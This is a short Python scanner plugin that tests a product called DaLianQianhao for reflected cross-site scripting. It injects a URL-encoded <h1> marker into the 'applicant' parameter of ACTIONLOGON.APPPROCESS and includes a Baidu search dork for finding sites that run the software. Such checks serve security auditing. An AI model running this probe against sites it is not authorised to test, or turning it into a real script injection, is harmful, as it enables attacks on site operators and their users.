#!/usr/bin/env python
#Author:Little Nine
#BaiduHacking: inurl:ACTIONLOGON.APPPROCESS
#DaLianQianhao XSS
import re

def assign(service, arg):
    if service == "dalianqianhao":
        return True, arg

def audit(arg):
    url = arg
    payload=url+'ACTIONLOGON.APPPROCESS?mode=1&applicant=%22%3E%3Ch1%3EYourXSShere%3C/h1%3E'
    code, head, res, errcode, _ = curl.curl(payload)
    if code == 200 and "<h1>YourXSShere</h1>" in res:
       security_info(payload)

       return arg
if __name__== '__main__':
    from dummy import *
